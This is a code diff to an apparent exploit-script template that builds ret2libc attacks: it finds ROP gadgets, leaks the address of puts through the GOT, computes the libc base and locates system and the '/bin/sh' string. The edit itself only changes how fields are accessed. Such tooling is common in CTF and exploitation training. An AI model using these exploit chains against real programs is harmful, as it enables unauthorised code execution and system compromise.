@@ -49,9 +49,9 @@ print("Offset:", offset)
 
 STEP 2: FIND GADGETS
 ────────────────────────────────────────────────────────────────────────────
-let pop_rdi = rop_find("{}", "pop rdi; ret")[0].address
-let pop_rsi = rop_find("{}", "pop rsi; ret")[0].address
-let ret = rop_find("{}", "ret")[0].address
+let pop_rdi = rop_find("{}", "pop rdi; ret")[0]["address"]
+let pop_rsi = rop_find("{}", "pop rsi; ret")[0]["address"]
+let ret = rop_find("{}", "ret")[0]["address"]
 
 STEP 3: BUILD ROP CHAIN
 ────────────────────────────────────────────────────────────────────────────
@@ -141,7 +141,7 @@ print("[+] Buffer offset:", offset)
 let puts_plt = find_symbol("{}", "puts", section: "plt")
 let puts_got = find_symbol("{}", "puts", section: "got")
 let main = find_symbol("{}", "main")
-let pop_rdi = rop_find("{}", "pop rdi; ret")[0].address
+let pop_rdi = rop_find("{}", "pop rdi; ret")[0]["address"]
 
 print("[+] Leaking libc...")
 let payload1 = "A" * offset + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
@@ -151,9 +151,9 @@ let leak = u64(recv_until(s, "\n")[0..8])
 print("[+] Leaked puts: 0x" + hex(leak))
 
 let matches = libc_search("puts", leak)
-let libc_base = leak - matches[0].symbols["puts"]
-let system = libc_base + matches[0].symbols["system"]
-let binsh = libc_base + matches[0].symbols["str_bin_sh"]
+let libc_base = leak - matches[0]["symbols"]["puts"]
+let system = libc_base + matches[0]["symbols"]["system"]
+let binsh = libc_base + matches[0]["symbols"]["str_bin_sh"]
 
 print("[+] libc base: 0x" + hex(libc_base))
 print("[+] system: 0x" + hex(system))
